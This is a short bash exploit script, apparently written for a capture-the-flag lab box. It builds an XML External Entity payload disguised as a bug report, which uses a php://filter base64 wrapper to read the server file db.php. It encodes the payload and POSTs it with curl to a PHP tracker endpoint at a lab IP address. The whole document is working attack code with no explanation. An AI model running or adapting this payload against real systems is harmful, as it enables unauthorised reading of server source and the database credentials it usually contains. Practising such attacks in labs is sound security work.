#!/bin/bash

datos=$(urlencode $(echo "<?xml  version='1.0' encoding='ISO-8859-1'?>
	<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=db.php' >]>
		<bugreport>
                <title>&xxe;</title>
                <cwe>hehehe</cwe>
                <cvss>hehehe</cvss>
                <reward>hehehe</reward>
                </bugreport>" | base64 | tr -d '\n'))
                
curl -s -X POST -d data="$datos" http://10.10.11.100/tracker_diRbPr00f314.php